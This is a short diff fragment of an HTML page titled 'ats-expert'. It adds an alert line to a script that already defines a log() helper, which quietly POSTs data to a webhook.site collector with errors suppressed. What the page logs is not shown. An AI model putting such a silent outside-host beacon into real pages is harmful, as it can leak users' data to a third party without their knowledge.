@@ -3,6 +3,7 @@
 <head><meta charset="utf-8"><title>ats-expert</title></head>
 <body>
 <script>
+  alert('script start');
   const HOOK='https://webhook.site/adf2fe42-6019-4297-b27a-ca8bf04acf73';
   function log(x){fetch(HOOK,{method:'POST',mode:'no-cors',body:x}).catch(()=>{})}
 
